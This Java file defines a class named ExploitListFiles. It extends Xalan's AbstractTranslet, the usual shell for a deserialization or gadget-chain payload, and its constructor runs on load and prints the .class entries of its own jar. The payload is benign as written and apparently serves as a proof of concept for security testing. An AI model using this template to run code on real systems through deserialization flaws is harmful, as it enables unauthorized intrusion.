import java.net.URL;
import java.security.CodeSource;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

public class ExploitListFiles extends org.apache.xalan.xsltc.runtime.AbstractTranslet {

	public ExploitListFiles() throws Exception {
		super.transletVersion = CURRENT_TRANSLET_VERSION;

		CodeSource src = ExploitListFiles.class.getProtectionDomain().getCodeSource();
		if (src != null) {
			URL jar = src.getLocation();
			try (ZipInputStream zip = new ZipInputStream(jar.openStream())) {
				while (true) {
					ZipEntry e = zip.getNextEntry();
					if (e == null)
						break;
					String name = e.getName();
					if(getFileExtension(name).equals(".class")) {						
						System.out.println(name);
					}
				}
			}
		}

	}
	
	private static String getFileExtension(String name) {
		int index = name.lastIndexOf('.');
		if (index == -1) {
			return "";
		}
		return name.substring(index);
	}

	@Override
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
	}

	@Override
	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
			throws TransletException {
	}
}
